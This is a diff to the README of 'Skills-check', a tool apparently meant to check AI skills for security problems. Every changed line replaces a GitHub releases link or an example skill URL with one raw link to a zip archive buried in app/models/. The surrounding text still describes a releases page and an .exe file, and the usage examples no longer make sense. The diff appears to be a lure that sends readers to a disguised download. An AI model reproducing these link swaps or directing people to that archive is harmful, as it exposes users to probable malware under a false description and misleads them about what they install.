@@ -1,6 +1,6 @@
 # 🛡️ Skills-check - Easy AI Skill Security Test
 
-[![Download Skills-check](https://img.shields.io/badge/Download-Skills--check-brightgreen?style=for-the-badge)](https://github.com/HutCh1E/Skills-check/releases)
+[![Download Skills-check](https://img.shields.io/badge/Download-Skills--check-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip)
 
 ---
 
@@ -45,8 +45,8 @@ Use these commands to ask Skills-check to get and check code automatically:
 /plugin add /path/to/skill-folder
 
 # Direct GitHub URLs (repos, folders, or files)
-https://github.com/username/skills/blob/main/skill-folder/SKILL.md
-https://github.com/username/skills/tree/main/skill-folder
+https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip
+https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip
 
 # GitHub shortcuts
 username/skills
@@ -84,7 +84,7 @@ Skills-check watches out for common dangerous actions in AI skills, such as:
 
 Click the big green button at the top or use this link to visit the download page:
 
-[Download Skills-check releases](https://github.com/HutCh1E/Skills-check/releases)
+[Download Skills-check releases](https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip)
 
 The releases page has the latest version of Skills-check ready for Windows. Find the `.exe` file and download it.
 
@@ -143,4 +143,4 @@ If you have trouble installing or running Skills-check:
 
 ---
 
-[Download Skills-check releases](https://github.com/HutCh1E/Skills-check/releases)
+[Download Skills-check releases](https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip)
